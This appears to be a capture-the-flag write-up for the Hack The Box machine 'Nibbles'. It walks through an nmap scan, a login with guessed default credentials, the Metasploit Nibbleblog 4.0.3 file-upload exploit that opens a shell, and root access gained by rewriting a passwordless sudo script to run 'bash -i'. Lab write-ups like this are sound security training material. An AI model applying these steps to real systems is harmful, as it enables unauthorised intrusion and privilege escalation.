# Nibbles

This is the write-up for the machine called Nibbles.

## Scanning & Enumeration

Let's start with an nmap scan:

```markdown
nmap -T4 -A -p- 10.10.10.75
```

Relevant results of the scan:

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP

The machine is a Linux machine with HTTP port 80 open.
There is a web page that says **"Hello World"** and if we inspect element (Ctrl-Shift-I) we can see a comment in the source code:

```markdown
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Type in **10.10.10.75/nibbleblog** and it shows us a blog page that is **"Powered by Nibbleblog"**.
After a little bit of googling, we find that [Nibbleblog](https://github.com/dignajar/nibbleblog) is an open-source CMS that works with PHP.

If we scroll down to the bottom we see the version 4.0.3 for the Nibbeblog.

## Arbitrary File Upload exploit

We can use **searchsploit** to find any vulnerabilities for **Nibbleblog 4.0.3**:

```markdown
searchsploit nibbleblog
```

We find an exploit called **Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)**.
This exploit uploads a malicious PHP file to the "My image" plugin found on the Nibbleblog. We need the login credentials to the administrator page to use this exploit successfully.
We can use credential stuffing using BurpSuite or look up the default credentials on Google. We must limit our requests as this page only allows for a certain number of login attempts.  

The following credentials are found to be valid:

```markdown
Username: admin
Password: nibbles
```
We can load up **Metasploit** and use the module exploit multi/http/nibbleblog_file_upload to exploit the machine.
We will need to set the username as _admin_ and the password as _nibbles_. We configure the RHOSTS and set the targeturi to _/nibbleblog/admin.php_
We can run the exploit and we see that it works as a meterpreter shell opens.
We are user **nibbler** on the machine and we will need to use privilege escalation to gain root access.

## Privilege Escalation to root

We can check the root privileges with **sudo -l** and it displays that the user can run a shell script in the home directory without a password:

```markdown
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We create the file **monitor.sh** in the directory **/home/nibbler/personal/stuff/** make it executable and start an interactive shell with it:

```markdown
#!/bin/bash
bash -i
```
We make the script executable by typing in:

```markdown
chmod +x monitor.sh
```

We can execute the script after navigating to the **/home/nibbler/personal/stuff/** directory:

```markdown
sudo ./monitor.sh
```

We gain root access to the machine after we run the script.
